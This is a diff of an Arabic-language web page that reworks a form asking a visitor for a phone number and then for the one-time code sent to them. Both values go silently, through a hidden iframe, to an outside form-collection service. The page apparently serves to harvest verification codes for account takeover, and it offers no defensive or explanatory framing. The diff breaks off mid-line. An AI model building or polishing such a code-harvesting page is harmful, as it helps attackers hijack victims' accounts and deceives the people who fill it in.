@@ -3,159 +3,179 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>نموذج رقم الهاتف والكود - إرسال الكود في كل الأوقات</title>
+  <title>نموذج رقم الهاتف والكود</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #f9f9f9;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #f0f2f5;
       display: flex;
       justify-content: center;
       align-items: center;
-      min-height: 100vh;
+      height: 100vh;
       margin: 0;
       direction: rtl;
-      text-align: right;
     }
-    form {
-      background: #fff;
-      padding: 20px 30px;
-      border-radius: 8px;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    .container {
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.1);
+      padding: 30px 40px;
       width: 100%;
-      max-width: 400px;
-      margin-bottom: 15px;
+      max-width: 420px;
+      box-sizing: border-box;
+    }
+    h2 {
+      text-align: center;
+      margin-bottom: 25px;
+      color: #333;
+      font-weight: 700;
     }
     label {
       display: block;
-      margin-bottom: 6px;
-      font-weight: bold;
-      color: #333;
+      margin-bottom: 8px;
+      font-weight: 600;
+      color: #555;
     }
     input[type="tel"],
     input[type="text"] {
       width: 100%;
-      padding: 10px 12px;
-      margin-bottom: 15px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      font-size: 14px;
-      box-sizing: border-box;
+      padding: 12px 15px;
+      font-size: 16px;
+      border-radius: 8px;
+      border: 1.8px solid #ccc;
+      margin-bottom: 20px;
+      transition: border-color 0.3s ease;
       font-family: inherit;
+      box-sizing: border-box;
+    }
+    input[type="tel"]:focus,
+    input[type="text"]:focus {
+      border-color: #28a745;
+      outline: none;
     }
     button {
       width: 100%;
-      padding: 12px;
+      padding: 14px;
+      font-size: 18px;
       background-color: #28a745;
-      color: white;
       border: none;
-      border-radius: 5px;
-      font-size: 16px;
+      border-radius: 8px;
+      color: white;
       cursor: pointer;
+      font-weight: 700;
       transition: background-color 0.3s ease;
     }
-    button:hover {
+    button:hover:not(:disabled) {
       background-color: #218838;
+    }
+    button:disabled {
+      background-color: #94d3a2;
+      cursor: not-allowed;
+    }
+    #timer {
+      text-align: center;
+      font-weight: 600;
+      color: #666;
+      margin-bottom: 20px;
+      min-height: 24px;
     }
     #codeField {
       display: none;
     }
-    #timer {
-      font-weight: bold;
-      margin-bottom: 15px;
-      color: #555;
+    #messageBox {
+      margin-top: 10px;
       text-align: center;
+      font-weight: 600;
+      min-height: 22px;
+      color: #d9534f; /* أحمر للأخطاء، يتغير حسب الحالة */
+      transition: opacity 0.3s ease;
+    }
+    #messageBox.success {
+      color: #28a745;
     }
   </style>
 </head>
 <body>
 
-  <!-- نموذج إرسال رقم الهاتف -->
-  <form id="phoneForm" action="https://formcarry.com/s/gv93b8b6cht" method="POST" target="hidden_iframe" onsubmit="return sendPhoneOnly();">
-    <label for="phone">رقم الهاتف:</label>
-    <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" title="أدخل رقم هاتف صحيح" />
-    <button type="submit" id="sendPhoneBtn">إرسال رقم الهاتف</button>
-    <div id="timer" style="display:none;"></div>
-  </form>
+  <div class="container">
+    <h2>نموذج رقم الهاتف والكود</h2>
+    <form id="mainForm" action="https://formcarry.com/s/gv93b8b6cht" method="POST" target="hidden_iframe" onsubmit="return handleSubmit(event);">
+      <label for="phone">رقم الهاتف:</label>
+      <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" title="أدخل رقم هاتف صحيح" autocomplete="tel" />
 
-  <!-- نموذج إرسال الكود -->
-  <form id="codeForm" action="https://formcarry.com/s/gv93b8b6cht" method="POST" target="hidden_iframe" onsubmit="return validateAndSendCode();">
-    <div id="codeField">
-      <label for="code">الكود المرسل إليك:</label>
-      <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" required />
-      <button type="submit">إرسال الكود</button>
-    </div>
-  </form>
+      <button type="button" id="sendPhoneBtn" onclick="sendPhone()">إرسال رقم الهاتف</button>
+
+      <div id="timer"></div>
+
+      <div id="codeField">
+        <label for="code">الكود المرسل إليك:</label>
+        <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" autocomplete="one-time-code" />
+        <button type="submit" id="sendCodeBtn">إرسال الكود</button>
+      </div>
+      <div id="messageBox"></div>
+    </form>
+  </div>
 
   <iframe name="hidden_iframe" style="display:none;"></iframe>
 
   <script>
     let countdownInterval;
+    const messageBox = document.getElementById('messageBox');
 
-    function sendPhoneOnly() {
+    function showMessage(msg, type = 'error') {
+      messageBox.textContent = msg;
+      if(type === 'success'){
+        messageBox.classList.add('success');
+      } else {
+        messageBox.classList.remove('success');
+      }
+      messageBox.style.opacity = '1';
+      setTimeout(() => {
+        messageBox.style.opacity = '0';
+      }, 3000);
+    }
+
+    function sendPhone() {
       const phoneInput = document.getElementById('phone');
       const sendPhoneBtn = document.getElementById('sendPhoneBtn');
       const timerDisplay = document.getElementById('timer');
       const codeField = document.getElementById('codeField');
 
       if (!phoneInput.value.match(/^[0-9]{10,15}$/)) {
-        alert('يرجى إدخال رقم هاتف صحيح مكون من 10 إلى 15 رقماً');
+        showMessage('يرجى إدخال رقم هاتف صحيح مكون من 10 إلى 15 رقماً', 'error');
         phoneInput.focus();
-        return false;
+        return;
       }
 
-      document.getElementById('phoneForm').submit();
+      // إزالة رسالة سابقة
+      messageBox.style.opacity = '0';
+
+      // تجهيز حقل الكود المخفي للإرسال مع الرقم فارغ (لإرسال رقم الهاتف فقط)
+      let codeFieldHidden = document.querySelector('input[name="code"]');
+      if (!codeFieldHidden) {
+        codeFieldHidden = document.createElement('input');
+        codeFieldHidden.type = 'hidden';
+        codeFieldHidden.name = 'code';
+        document.getElementById('mainForm').appendChild(codeFieldHidden);
+      }
+      codeFieldHidden.value = '';
+
+      document.getElementById('mainForm').submit();
 
       codeField.style.display = 'block';
-      timerDisplay.style.display = 'block';
       sendPhoneBtn.disabled = true;
 
       let timeLeft = 480; // 8 دقائق
 
-      function updateTimer() {
+      timerDisplay.textContent = `يرجى الانتظار: 08:00`;
+
+      clearInterval(countdownInterval);
+      countdownInterval = setInterval(() => {
+        timeLeft--;
         const minutes = Math.floor(timeLeft / 60).toString().padStart(2, '0');
         const seconds = (timeLeft % 60).toString().padStart(2, '0');
         timerDisplay.textContent = `يرجى الانتظار: ${minutes}:${seconds}`;
         if (timeLeft <= 0) {
           clearInterval(countdownInterval);
-          timerDisplay.style.display = 'none';
-          sendPhoneBtn.disabled = false;
-        }
-        timeLeft--;
-      }
-
-      updateTimer();
-      countdownInterval = setInterval(updateTimer, 1000);
-
-      alert('تم إرسال رقم الهاتف، يمكنك الآن إدخال الكود في أي وقت.');
-
-      return false; // منع إعادة تحميل الصفحة
-    }
-
-    function validateAndSendCode() {
-      const codeInput = document.getElementById('code');
-      if (codeInput.value.trim() === '') {
-        alert('يرجى كتابة الكود المرسل إليك.');
-        codeInput.focus();
-        return false;
-      }
-
-      const phoneValue = document.getElementById('phone').value;
-      let phoneField = document.querySelector('#codeForm input[name="phone"]');
-      if (!phoneField) {
-        phoneField = document.createElement('input');
-        phoneField.type = 'hidden';
-        phoneField.name = 'phone';
-        document.getElementById('codeForm').appendChild(phoneField);
-      }
-      phoneField.value = phoneValue;
-
-      document.getElementById('codeForm').submit();
-
-      alert('تم إرسال الكود ورقم الهاتف.');
-
-      return false; // منع إعادة تحميل الصفحة
-    }
-  </script>
-
-</body>
-</html>
+          timerDisplay.textContent = '';
+          sendPhoneBtn.disabled
